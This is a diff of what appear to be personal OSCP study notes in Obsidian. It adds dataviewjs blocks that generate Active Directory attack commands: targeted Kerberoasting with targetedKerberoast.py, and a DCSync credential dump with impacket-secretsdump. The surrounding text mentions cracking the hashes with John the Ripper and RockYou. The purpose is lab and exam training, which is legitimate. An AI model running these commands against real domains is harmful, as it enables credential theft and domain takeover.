@@ -192,7 +192,15 @@ From UNIX-like systems, this can be done with [**targetedKerberoast.py**](https
 
 Further, with the help of John the Ripper end the dictionary such as Rock You can help the attacker to brute force the weak password.
 
-./targetedKerberoast.py --dc-ip '192.168.1.7' -v -d 'ignite.local' -u 'radha' -p 'Password@1'
+MODIFY VV
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `cp ~/Desktop/Tools/Windows . && python3 targetedKerberoast.py --dc-ip '${ip}' -v -d '${discoveredDomain}' -u '[user]' -p '[password]'`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 
 ![GenericWrite Active Directory Abuse](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgzCvkq1G1w_LhrqeokVxc7iQgg0wykE2kBY-kP0IaOcI7gFlx62isK0UR0BxCaZZqjET0q-K2-j8j3dDuhMaurqFNfiG64MWV89lZ3NcP8zN_X6JFueZA26baP120Eo3VJOGiPwRZkl72fgqs5-sNlT-jY9nCYPy3LOKemFVsPQAlUdobnC9rDLTJdhYf4/s16000/24.png)
 
@@ -219,3 +227,16 @@ $User | Get-DomainSPNTicket
 # GPO-Abuse
 
 [[GPO Abuse]]
+
+---
+
+# DCSync
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `impacket-secretsdump [user]:[pw]@${discoveredDomain}`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
